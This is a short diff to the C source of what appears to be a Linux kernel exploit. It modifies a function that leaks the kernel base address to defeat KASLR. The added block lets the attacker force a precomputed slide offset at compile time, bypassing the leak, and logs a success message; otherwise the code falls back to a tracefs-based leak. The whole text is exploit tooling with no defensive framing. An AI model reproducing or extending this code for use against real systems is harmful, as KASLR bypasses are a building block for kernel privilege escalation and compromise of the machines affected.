@@ -212,5 +212,23 @@ int slide_leak_kernel_base(void) {
                (unsigned long long)kaslr_slide, slide_p0_offset);
     return 1;
   }
+
+#ifdef APP_FORCED_SLIDE_P0_OFFSET
+  unsigned long long target_val = APP_FORCED_SLIDE_P0_OFFSET;
+  if (target_val > 0x1f0000ULL || (target_val & 0xffffULL) != 0) {
+    pr_error("slide invalid target forced p0 offset=%llx\n", target_val);
+    return 0;
+  }
+  slide_p0_offset = (uintptr_t)target_val;
+  kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
+  kaslr_slide = slide_p0_offset;
+  kaslr_done = 1;
+  pr_success("slide-kaslr-ok source=target-forced pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08zx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+#endif
+
   return slide_tracefs_leak_kernel_base();
 }
